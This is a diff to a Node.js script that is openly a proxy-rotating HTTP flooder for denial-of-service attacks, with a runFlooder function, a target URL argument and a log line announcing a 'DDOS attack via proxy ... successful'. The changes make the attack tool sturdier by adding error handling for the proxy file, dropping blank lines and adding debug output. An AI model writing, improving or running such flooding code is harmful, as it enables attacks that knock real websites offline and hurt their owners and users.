@@ -209,6 +209,12 @@ const args = {
   proxyFile: process.argv[6]
 }
 var proxies = readLines(args.proxyFile);
+// if (proxies.length === 0) {
+//   console.error("Proxy file is empty or could not be read.");
+//   process.exit();
+// } else {
+//   console.log("Loaded proxies:", proxies);
+// }
 const parsedTarget = url.parse(args.target);
 
 const MAX_RAM_PERCENTAGE = 80;
@@ -295,7 +301,12 @@ function getRandomInt(min, max) {
 const Socker = new NetSocket();
 
 function readLines(filePath) {
-  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+  try {
+    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== '');
+  } catch (error) {
+    console.error("Error reading proxy file:", error.message);
+    process.exit();
+  }
 }
 function getRandomValue(arr) {
   const randomIndex = Math.floor(Math.random() * arr.length);
@@ -331,6 +342,7 @@ function randstrs(length) {
 const randstrsValue = randstrs(10);
 function runFlooder() {
   const proxyAddr = randomElement(proxies);
+  // console.log("Using proxy:", proxyAddr);
   const parsedProxy = proxyAddr.split(":");
   const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
   const nm = [
@@ -595,6 +607,7 @@ function runFlooder() {
             weight: 220,
           })
             .on('response', response => {
+              console.log(`DDOS attack via proxy ${proxyAddr} successful. Status: ${response[":status"]}`);
               request.close();
               request.destroy();
 
